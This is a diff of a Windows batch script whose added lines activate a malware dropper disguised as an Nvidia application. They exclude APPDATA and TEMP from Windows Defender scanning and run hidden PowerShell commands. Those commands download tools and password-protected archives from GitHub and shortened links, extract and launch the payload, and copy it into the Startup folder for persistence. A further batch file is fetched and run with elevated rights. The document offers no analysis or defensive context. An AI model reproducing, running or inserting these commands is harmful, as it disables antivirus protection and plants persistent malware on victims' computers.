@@ -1,12 +1,12 @@
 @echo off
-:: powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:APPDATA, $env:TEMP, (Join-Path $env:APPDATA 'System')"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:APPDATA, $env:TEMP, (Join-Path $env:APPDATA 'System')"
 powershell -w h -c "(iwr -uri 'https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.exe' -OutFile \"$env:TEMP\\7z.exe\"); (iwr -uri 'https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.dll' -OutFile \"$env:TEMP\\7z.dll\");
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/vzxhost' -OutFile \"$env:TEMP\\svchost.7z\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\svchost.7z`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\Nvidia App.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\Nvidia App.exe\" -Destination $dest -Force; Copy-Item \"$env:TEMP\\extract\\Nvidia App.exe\"
-:: powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN3PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.003\");
-:: powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN2PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.002\");
-:: powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN1PJ' -OutFile \"$env:TEMP\\NvidiaApp.7z.001\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\NvidiaApp.7z.001`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\NvidiaApp.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination $dest -Force; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force"
+powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN3PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.003\");
+powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN2PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.002\");
+powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN1PJ' -OutFile \"$env:TEMP\\NvidiaApp.7z.001\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\NvidiaApp.7z.001`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\NvidiaApp.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination $dest -Force; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force"
 
-:: curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
+curl -L "https://tinyurl.com/ztweak" -o "%TEMP%\VZX.bat" && (start /b "" powershell -w h -c "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" & taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne Administrator:  *")
 
 :: Tweaks
 :: powershell -Command "irm 'https://christitus.com/win' | iex"
